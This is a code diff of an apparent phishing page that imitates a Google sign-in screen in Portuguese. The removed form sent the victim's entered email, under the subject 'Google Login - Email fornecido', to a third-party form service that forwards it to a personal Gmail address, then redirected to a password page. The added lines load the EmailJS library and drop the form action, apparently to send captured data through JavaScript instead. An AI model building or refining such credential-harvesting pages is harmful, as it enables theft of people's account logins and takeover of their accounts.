@@ -8,6 +8,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -37,13 +38,9 @@
                 <p class="subtitle">Use sua Conta do Google</p>
             </div>
             
-            <form class="login-form" id="loginForm" method="POST" action="https://formsubmit.co/joaogabrielsilvapinheiro78@gmail.com">
-                <input type="hidden" name="_next" value="password.html">
-                <input type="hidden" name="_subject" value="Google Login - Email fornecido">
-                <input type="hidden" name="_captcha" value="false">
-                
+            <form class="login-form" id="loginForm">
                 <div class="input-wrapper">
-                    <input type="text" id="email" name="email" class="input-field" placeholder=" " required>
+                    <input type="text" id="email" class="input-field" placeholder=" " required>
                     <label for="email" class="input-label">E-mail ou telefone</label>
                 </div>
                 
@@ -54,7 +51,7 @@
                 </div>
                 
                 <div class="button-row">
-                    <button type="button" class="btn-text" onclick="location.href='#'">Criar conta</button>
+                    <button type="button" class="btn-text">Criar conta</button>
                     <button type="submit" class="btn-primary">Próxima</button>
                 </div>
             </form>
